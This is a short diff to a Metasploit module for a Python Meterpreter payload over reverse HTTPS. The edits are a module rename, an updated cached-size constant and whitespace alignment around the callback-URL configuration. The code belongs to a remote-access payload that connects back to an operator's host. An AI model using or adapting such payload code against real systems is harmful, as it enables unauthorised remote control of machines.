@@ -10,9 +10,9 @@ require 'msf/core/payload/python/meterpreter_loader'
 require 'msf/core/payload/python/reverse_http'
 require 'msf/base/sessions/meterpreter_python'
 
-module Metasploit4
+module MetasploitModule
 
-  CachedSize = 51594
+  CachedSize = 51278
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -36,7 +36,7 @@ module Metasploit4
     opts[:scheme] = 'https'
     opts[:uri_uuid_mode] = :init_connect
     met = stage_meterpreter({
-      http_url: generate_callback_url(opts),
+      http_url:        generate_callback_url(opts),
       http_user_agent: opts[:user_agent],
       http_proxy_host: opts[:proxy_host],
       http_proxy_port: opts[:proxy_port]
